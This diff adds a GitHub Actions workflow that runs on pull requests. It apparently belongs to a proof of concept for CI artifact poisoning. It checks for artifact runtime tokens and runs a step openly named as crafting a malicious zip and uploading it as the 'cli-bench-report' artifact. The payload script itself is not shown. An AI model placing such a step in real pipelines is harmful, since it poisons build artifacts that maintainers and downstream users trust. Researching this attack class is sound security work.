@@ -1,0 +1,22 @@
+name: cli-bench
+
+on:
+  pull_request:
+    branches: [main]
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  bench:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+    steps:
+      - name: Dump artifact env
+        run: |
+          echo "ACTIONS_RESULTS_URL set: ${ACTIONS_RESULTS_URL:+yes}"
+          echo "ACTIONS_RUNTIME_TOKEN set: ${ACTIONS_RUNTIME_TOKEN:+yes}"
+
+      - name: Craft malicious zip and upload it as cli-bench-report
+        run: bash .github/scripts/evil-upload.sh
